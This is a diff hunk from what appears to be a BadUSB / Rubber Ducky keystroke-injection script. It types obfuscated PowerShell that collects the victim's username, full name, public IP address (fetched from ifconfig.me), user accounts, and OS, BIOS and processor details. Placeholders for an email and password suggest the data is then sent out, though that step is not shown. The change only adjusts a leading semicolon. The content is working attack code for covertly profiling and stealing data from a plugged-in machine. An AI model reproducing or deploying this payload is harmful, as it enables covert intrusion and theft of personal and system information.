@@ -27,7 +27,7 @@ STRING $eml = "EMAIL_HERE";$psw = "PASSWORD_HERE"
 REM main powershell code
 ENTER
 DELAY 100
-STRING $usr = "Username: $($usrinf.Name)";$usr += "`nFull Name: $($usrinf.FullName)`n";$usr+="Public Ip Address = ";$usr+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
+STRING ;$usr = "Username: $($usrinf.Name)";$usr += "`nFull Name: $($usrinf.FullName)`n";$usr+="Public Ip Address = ";$usr+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
 STRING ;$usr+="`n";$usr+="All User Accounts: `n";$usr+= Get-WmiObject -Class Win32_UserAccount;$sys = Get-WmiObject -Class Win32_OperatingSystem
 STRING ;$bios = Get-WmiObject -Class Win32_BIOS;$proc = Get-WmiObject -Class Win32_Processor;$comp = Get-WmiObject -Class Win32_ComputerSystem;$usrinf = Get-WmiObject -Class Win32_UserAccount
 STRING ;$sysstr = "Operating System: $($sys.Caption) $($sys.OSArchitecture)";$sysstr += "`nBIOS Version: $($bios.SMBIOSBIOSVersion)";$sysstr += "`nProcessor: $($proc.Name)"
